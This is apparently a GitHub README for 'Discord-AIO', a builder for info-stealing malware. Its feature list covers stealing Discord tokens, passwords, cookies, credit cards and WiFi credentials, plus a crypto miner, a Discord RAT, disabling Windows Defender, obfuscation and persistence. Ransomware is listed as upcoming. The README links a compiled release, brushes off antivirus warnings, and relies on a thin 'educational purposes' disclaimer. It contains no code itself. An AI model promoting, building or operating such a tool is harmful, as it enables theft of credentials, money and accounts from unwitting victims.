<div align="center">
 
# Discord-AIO
   
<p align="center"> 
  <a href="https://discord.gg/qjrDprutvg">
    <img src="https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png" width="240" height="240" />
  </a>
  
  [![developer](https://img.shields.io/badge/Developer-Nyxon-520702.svg?style=flat)](https://github.com/Nyxonn)
  [![discord](https://img.shields.io/badge/Discord-Nyxon%234418-520702.svg?style=flat)](https://discordapp.com/users/690624129153630248)
  ![developer](https://img.shields.io/badge/Version-0.6.3-520702.svg?style=flat)
</p>

## Disclaimer 

This program is for educational purposes only.<br /> 
How you use this program is your responsibility.<br />
<br />
I will not be held accountable for any illegal activities.   
   
## Contents Page
     
[Main features](https://github.com/kromosohn/discord-stealer-token-grabber/blob/main/README.md#main-features)<br/>
[Stealer features](https://github.com/kromosohn/discord-stealer-token-grabber/blob/main/README.md#stealer-features)<br/>
[Optional features](https://github.com/kromosohn/discord-stealer-token-grabber/blob/main/README.md#optional-stealer-features)<br/>
[Additional features](https://github.com/kromosohn/discord-stealer-token-grabber/blob/main/README.md#additional)<br/>
[Upcoming features](https://github.com/kromosohn/discord-stealer-token-grabber/blob/main/README.md#coming-soon)<br/>  
[Versions](https://github.com/kromosohn/discord-stealer-token-grabber/blob/main/README.md#versions)<br/>
[FAQ](https://github.com/kromosohn/discord-stealer-token-grabber/blob/main/README.md#faq)<br/> 
[Showcase](https://github.com/kromosohn/discord-stealer-token-grabber/blob/main/README.md#showcase)<br/>
[Credits](https://github.com/kromosohn/discord-stealer-token-grabber/blob/main/README.md#credits)<br/>
 
## Features of Discord AIO  
      
</div>


#### Main features
 
- [x] **Stealer** builder/compiler
- [x] Webhook checker
- [x] Webhook spammer 
- [x] Webhook deleter 
- [x] Token checker 
- [x] Token deleter
 
#### Stealer features

- [x] Stealing **discord token**
- [x] Stealing **IP address**
- [x] Stealing MAC Address
- [x] Stealing Desktop username

#### Optional stealer features

- [x] Stealing **passwords**
- [x] Stealing **cookies** 
- [x] Stealing **credit cards**
- [x] Stealing **VPN's**
- [x] Stealing **Windows Product Key**
- [x] Stealing browser history
- [x] Stealing **WiFi credentials**
- [x] Taking **desktop screenshot**
- [x] Discord **QR Token Grabber**
- [x] **Cryptocurrency miner**
- [x] Discord **RAT**
- [x] Disabling Windows Defender
- [x] Disabling Task Manager
- [x] Disabling Mouse and Keyboard
- [x] Blocking websites
- [x] Stealer **pumper**
- [x] Showing fake error
- [x] Disabling internet connection (! Can cause serious damage)
- [x] Showing BSOD (Blue Screen)
- [x] Automatically startup
- [x] Showing jumpscare
- [x] Hiding stealer
- [x] Your **custom plugins**
- [x] Fake windows cmd 
- [x] Fake discord nitro generator
- [x] Stealer **obfuscation**
- [x] Customizable stealer icon
- [x] Customizable embed color
- [x] Stealer metadata generator and **cloner**

#### Additional

- [x] Multi-language support
- [x] Customizable color of UI


### Coming soon

- [ ] Ransomware

<div align="center">
  
## Versions 
  
</div>
<div align="center">
  
**< 0.6.0**
  
</div>

Old branch.

<div align="center">
  
**0.6.0**
  
</div>

- Complete rework of UI
- Settings
- Version checks
- Multi-language support
- Customizable UI
- Minor stub fixes
  
<div align="center">
  
**0.6.1**
  
</div>

- UI fixes
- Added Discord RAT (thanks to Sp00p64)
- Added Spanish support
- Added French support

<div align="center">
  
**0.6.2**
  
</div>

- Fixed major stub bug
- Added possibility to save your settings for UI Color and Show username
- Added Fake Windows CMD and Fake Discord Nitro Generator
- Fixed webhook spammer error
- Deleted .dAIO encryption
- Major bugs fixed
  
<div align="center">
  
**0.6.3**
  
</div>

- Added QR Code grabber
- Discord AIO is now see-through while dragging
- Fake discord tools setup wizard
- Added save popup
- Added save translation
- Added navbar pages
- Added minimize button
- Added AppData fix button

<div align="center">

## FAQ

</div>

- Is it free?<br />
Yes, the program is 100% free and open source.

- Where can i get help?<br />
On Null Community [discord](https://discord.gg/qjrDprutvg).

- How to use it?<br />
You need to compile open source files or download released stable program from [here](https://github.com/kromosohn/discord-stealer-token-grabber/releases/download/Release/Release.rar).

- Antivirus reports program as malicious!<br />
Program contains the stub file which is necessary to make stealer work, it's all open source so if you are extremly scared check it by yourself.

- Will it be supported in the future?<br />
Yes, i'm planning the support for long period of time, mainly on Null Community [discord](https://discord.gg/qjrDprutvg).

- Not launching. <br />
Try to change your VPN connection.

<div align="center">

## Showcase

#### Main page
![obraz](https://user-images.githubusercontent.com/45857590/156886961-df9f1f2c-8df4-43de-95b6-845eaa405bb8.png)
#### Additional page
![obraz](https://user-images.githubusercontent.com/45857590/156886971-eacabb04-7ce4-4a23-91d4-1d7c71399ee8.png)
#### Inspector page
![obraz](https://user-images.githubusercontent.com/45857590/156887001-7ade9039-6668-480c-ae51-ac289001dac5.png)
#### Misc page
![obraz](https://user-images.githubusercontent.com/45857590/156887018-8427e3b4-811e-4efd-a2b0-35e8cec43ec5.png)
#### Miner page
![obraz](https://user-images.githubusercontent.com/45857590/156887025-0ab94b5b-e5d4-4566-b8a6-ea0067b821e5.png)
#### Settings page
![obraz](https://user-images.githubusercontent.com/45857590/156887035-3e024ce7-ea93-4085-8025-2519fc27a861.png)

## Packages

</div>

<br/>

- Leaf.xNet
- DiscordRPC
- Costura.Fody
- ScintillaNET
- Newtonsoft.Json

<div align="center">

## Credits
Discord AIO made by [Nyxon](https://github.com/Nyxonn)
<br />
Featuring [yunglean_](https://github.com/yunglean4171) and dv0l

[![paypal](https://www.paypalobjects.com/en_US/PL/i/btn/btn_donateCC_LG.gif)](https://www.paypal.com/donate/?hosted_button_id=LHX286XBZ5BZS)
  
<br/>
<br/>
  
If you like this project give it a star 
 